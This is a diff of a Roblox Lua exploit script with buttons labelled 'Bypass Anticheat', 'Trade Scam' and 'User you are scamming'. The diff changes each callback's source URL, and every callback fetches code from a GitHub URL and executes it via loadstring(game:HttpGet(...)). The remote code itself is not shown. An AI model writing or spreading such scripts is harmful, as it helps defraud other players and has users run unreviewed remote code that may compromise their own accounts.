@@ -34,7 +34,7 @@ local MainTab = Window:CreateTab("Main", 4483362458) -- The number is an asset I
 local Button = MainTab:CreateButton({
 Name = "Bypass Anticheat(Wait 5 min to bypass)",
 Callback = function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Adoptmeh'))()
 end
 })
 
@@ -43,7 +43,7 @@ local Toggle = MainTab:CreateToggle({
 Name = "Trade Scam",
 CurrentValue = false,
 Callback = function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Adoptmeh'))()
 end
 })
 -- Create an Input Box
@@ -52,7 +52,7 @@ Name = "User you are scamming",
 PlaceholderText = "Type here...",
 RemoveTextAfterFocusLost = false,
 Callback = function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Adoptmeh'))()
 end
 })
 
